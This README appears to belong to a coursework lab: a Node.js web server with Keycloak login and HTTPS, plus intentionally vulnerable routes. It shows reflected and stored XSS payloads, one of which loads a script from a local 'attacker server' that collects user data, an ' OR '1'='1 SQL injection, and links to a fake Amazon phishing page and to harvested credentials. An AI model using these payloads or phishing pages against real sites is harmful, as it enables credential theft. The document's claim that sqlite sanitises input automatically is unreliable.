# Web Server with Advanced Features: Keycloak, XSS, and HTTPS

## Project Description

This project implements a web server developed with Node.js and Express, featuring advanced functionalities such as:

* Integration with a Keycloak server for authentication using the OpenID Connect protocol.

* Simulations for Cross-Site Scripting (XSS) attacks, both non-persistent and persistent.

* Configuration for HTTPS access using a self-signed digital certificate.

* Logging capabilities to store relevant information for traffic analysis.

## Prerequisites

To run this project, install these:

* Node.js (v14+): Download Node.js

* Python 3.x: For the attacker server.

* Git: Download Git

* OpenSSL: On Windows, ensure you know the path to the OpenSSL executable (e.g., C:\Program Files\Git\usr\bin\openssl.exe).

## Project Setup

1. Clone the Repository
   ```sh
   git clone https://github.com/username/repo.git
   cd repo
   ```

2. Install Dependencies
   ```sh
   npm install
   ```

4. Generate a Self-Signed Digital Certificate

   If using OpenSSL, run the following command:
   ```sh
   openssl req -nodes -new -x509 -keyout server.key -out server.cert -days 365
   ```
   This will generate the `server.key` and `server.cert` files used for HTTPS configuration.

   You can use this command to use the openssl in Windows more easily
   ```
   "C:\Program Files\Git\usr\bin\openssl.exe" req -nodes -new -x509 -keyout server.key -out server.cert -days 365
   ```

## Key Features


### 1. Keycloak Integration

   The server supports authentication via OpenID Connect using a Keycloak server:
   `https://sso.utiasi.ro/`
   
   Example to access the private area:
   ```sh
   https://localhost:4567/private
   ```


### 2. XSS Attacks
#### a) Non-Persistent (Reflected) XSS
   The payload is passed via the URL and executed on the client:
   
   Example of a malicious URL:
   ```sh
   http://localhost:4567/cauta?q=<script>alert('XSS attack!')</script>
   ```

#### b) Persistent (Stored) XSS
   The payload is stored in the database and executed for all users accessing a specific page.
   
   Example of a payload injected through the registration form:
   ```sh
   <script src="http://127.0.0.1:5000/script.js"></script>
   ```


### 3. Logging
   The server uses the winston library to log HTTP request information, such as:
   * Request method (`request.method`)
   
   * HTTP headers (`request.headers`)
   
   * URL parameters (`request.args`)
   
   * Request body content (`request.body` or `request.json`)

   Log file analizer usage:
   
   ```sh
   # Show 4xx errors
   python log_analyzer.py 1
   
   # Show URL statistics
   python log_analyzer.py 2
   
   # Watch logs in real-time
   python log_analyzer.py 3
   
   # Specify a different log directory
   python log_analyzer.py 2 --log-dir /path/to/logs
   ```

### 4. HTTPS
   The application is configured to run over HTTPS using the generated certificate.
   
   Access it at:
   ```sh
   https://localhost:4567
   ```

### 5. SQL Injection
```
http://localhost:4567/cauta?q=' OR '1'='1
```
Here the query becomes ```SELECT * FROM users WHERE name = '' OR '1'='1' ``` and ```OR '1'='1'``` is always true, so this will return all the `users` table entries. To solve this problem we have to sanitise the entry data, using for example Sequelize. This sanitisation is automatically done by `sqlite`.

## Running the Servers

1. Start the Node.js Server

   Run the following command to start the main server:
   ```sh
   node app.js
   ```

   The server will be available at:
   ```sh
   https://localhost:4567
   ```


2. Start the Python Server (Attacker)
   ```sh
   python attacker_server.py
   ```

The server will receive data and log it in `server.log`.


## Usage Examples

### Non-Persistent XSS

* Access the URL:
  `http://localhost:4567/cauta?q=<script>alert('XSS attack!')</script>`

* The victim's browser will display an alert box with the text XSS attack!.

### Persistent XSS

Inject the payload in the registration form:

```sh
<script src="http://127.0.0.1:5000/script.js"></script>
```

Every user accessing the main page will execute the malicious code, sending data to the attacker's server.


## Possible problems and how to solve it:

Access to fetch at `http://localhost:5000/api/data` from origin `http://localhost:4567` has been blocked by CORS policy: Response to preflight request doesn't pass access control check: `No 'Access-Control-Allow-Origin' header is present on the requested resource`. If an opaque response serves your needs, set the request's mode to `no-cors` to fetch the resource with CORS disabled

You need to enable CORS on the server where the API is hosted (http://127.0.0.1:5000)


## Useful links

Link to see the phishing email: http://localhost:5000/api/email
Link to the fake amazon phishing page: http://localhost:5000/api/phishing
Link to view the credentials sent to the server: http://localhost:5000/api/view-credentials

